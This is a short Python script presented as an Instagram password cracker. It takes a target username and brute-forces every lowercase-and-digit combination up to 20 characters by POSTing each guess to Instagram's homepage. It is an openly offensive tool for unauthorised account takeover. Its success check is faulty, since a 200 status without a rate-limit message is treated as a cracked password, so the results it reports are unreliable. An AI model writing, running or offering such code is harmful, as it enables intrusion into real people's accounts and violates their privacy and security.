import requests
import itertools
import string

def brute_force_password(username):
    base_url = "https://www.instagram.com/"
    chars = string.ascii_lowercase + string.digits
    attempts = 0

    for password_length in range(1, 21):  # Maximum password length set to 20 characters
        for password_attempt in itertools.product(chars, repeat=password_length):
            password = ''.join(password_attempt)
            attempts += 1
            response = requests.post(base_url, data={'username': username, 'password': password})
            if response.status_code == 200 and "Please wait a few minutes before you try again" not in response.text:
                return password, attempts

    return None, attempts

username = input("Enter the Instagram username to crack: ")

password, attempts = brute_force_password(username)
if password:
    print(f"Password cracked successfully! Password: {password}")
    print(f"Total attempts made: {attempts}")
else:
    print("Failed to crack the password. Try increasing the maximum password length.")
